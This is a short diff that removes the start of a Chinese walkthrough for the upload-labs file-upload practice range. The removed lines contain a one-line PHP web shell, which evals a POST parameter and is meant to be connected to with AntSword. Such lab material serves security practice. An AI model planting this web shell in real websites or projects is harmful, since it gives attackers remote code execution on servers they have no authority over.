@@ -1,8 +1,0 @@
-# 前言
-靶场地址：https://github.com/c0ny1/upload-labs
-
-# pass-01
-写一个链接蚁剑的脚本
-```
-<?php phpinfo(); @eval($_POST['root']); ?>
-```
